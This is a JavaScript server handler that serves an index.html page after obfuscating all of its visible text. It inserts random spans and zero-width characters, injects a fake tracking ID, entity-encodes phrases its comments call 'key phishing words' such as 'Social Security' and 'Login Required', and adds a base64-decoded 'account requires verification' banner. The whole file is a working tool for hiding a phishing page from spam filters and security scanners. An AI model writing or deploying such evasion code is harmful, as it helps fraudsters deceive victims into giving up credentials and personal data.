import fs from "fs";
import path from "path";

// Function to generate a random obfuscation span
function randomObfuscationSpan() {
    const randomString = Math.random().toString(36).substring(2, 6);
    return `<span style='content:"${randomString}";'></span>`;
}

// Function to inject invisible zero-width characters randomly
function injectZeroWidthCharacters(text) {
    const zeroWidthChars = ["&#x200B;", "&#x200C;", "&#x200D;", "&#x2060;"];
    return text.replace(/([a-zA-Z0-9])/g, (match) => {
        let zwChar = zeroWidthChars[Math.floor(Math.random() * zeroWidthChars.length)];
        return match + zwChar;
    });
}

// Function to apply multiple layers of obfuscation
function obfuscateText(text) {
    let obfuscated = text.replace(/([a-zA-Z0-9])/g, (match) => {
        return match + randomObfuscationSpan();
    });
    return injectZeroWidthCharacters(obfuscated); // Additional zero-width encoding
}

// Function to generate a fake but realistic tracking ID
function generateFakeTrackingID() {
    let id = "";
    for (let i = 0; i < 6; i++) {
        id += Math.floor(Math.random() * 999999).toString().padStart(6, "0") + "-";
    }
    return id.slice(0, -1);
}

// Function to encode text into HTML entity format
function htmlEntityEncode(text) {
    return text.replace(/./g, (char) => `&#${char.charCodeAt(0)};`);
}

// Function to base64 encode and inject JavaScript decoder
function base64Obfuscate(text) {
    let encoded = Buffer.from(text).toString("base64");
    return `<script>document.write(atob("${encoded}"));</script>`;
}

// API Handler to serve obfuscated HTML
export default async function handler(req, res) {
    try {
        // Get the absolute path of the index.html file
        const filePath = path.join(process.cwd(), "index.html");

        // Read the index.html file
        let html = fs.readFileSync(filePath, "utf-8");

        // Preserve HTML structure and obfuscate only visible text
        let modifiedHTML = html.replace(/>([^<>]+)</g, (match, text) => {
            if (text.trim() !== "") {
                return ">" + obfuscateText(text) + "<"; // Multi-layer text obfuscation
            }
            return match;
        });

        // Inject a fake tracking ID
        let fakeTrackingID = generateFakeTrackingID();
        modifiedHTML = modifiedHTML.replace(/Tracking ID:\s*\d+/g, `Tracking ID: ${fakeTrackingID}`);

        // Encode key phishing words in HTML entities
        modifiedHTML = modifiedHTML.replace(/(Social Security|Account Update|Login Required)/gi, (match) => {
            return htmlEntityEncode(match);
        });

        // Inject hidden Base64-encoded JavaScript decoder
        modifiedHTML = modifiedHTML.replace(/<body>/, `<body>${base64Obfuscate("Important Security Update: Your account requires verification.")}`);

        // Set cache-control headers to prevent caching & ensure fresh obfuscation on each reload
        res.setHeader("Content-Type", "text/html");
        res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        res.setHeader("Expires", "0");
        res.setHeader("Pragma", "no-cache");

        return res.status(200).send(modifiedHTML);
    } catch (error) {
        console.error("Error reading/modifying HTML:", error);
        return res.status(500).send("Error processing the HTML file.");
    }
}
